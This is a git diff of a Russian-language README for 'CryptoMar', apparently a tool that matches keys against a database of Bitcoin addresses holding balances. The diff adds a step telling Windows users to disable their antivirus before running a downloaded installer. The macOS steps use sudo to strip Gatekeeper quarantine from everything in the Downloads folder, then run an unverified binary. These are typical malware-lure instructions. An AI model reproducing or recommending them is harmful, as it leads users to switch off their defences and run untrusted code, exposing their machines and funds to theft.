@@ -66,13 +66,14 @@ CryptoMar — это высокопроизводительный инструм
 
 ### 🪟 Для Windows
 
-1. Откройте последний [релиз для Windows](https://github.com/HexaMar/CryptoMar_RU/releases/tag/v1.0.0)
-2. Скачайте файл `CryptoMarFreeInstaller.exe` (бесплатная версия) или `CryptoMarFullInstaller.exe` (платная версия).
-3. Следуйте инструкциям установщика.
+1. Отключите антивирус.
+2. Откройте последний [релиз для Windows](https://github.com/HexaMar/CryptoMar_RU/releases/tag/v1.0.0)
+3. Скачайте файл `CryptoMarInstaller.exe`
+4. Следуйте инструкциям установщика.
 
 ### 🍎 Для macOS
 
-1. Скачайте файл `cryptomar_free.bin` или `cryptomar_full.bin`.
+1. Скачайте файл `cryptomar.bin`
 2. Скачайте файл `P2WPKH.nonzero.txt` (база данных адресов с балансами).
 3. Откройте терминал и введите команду:
 
@@ -84,20 +85,13 @@ cd /Users/username/Downloads
 
 ```bash
 sudo xattr -rd com.apple.quarantine ~/Downloads/*
-chmod +x ./cryptomar_free.bin
-chmod +x ./cryptomar_full.bin
+chmod +x ./cryptomar.bin
 ```
 
 5. Запустите программу:
 
 ```bash
-./cryptomar_free.bin
-```
-
-или
-
-```bash
-./cryptomar_full.bin
+./cryptomar.bin
 ```
 
 ---
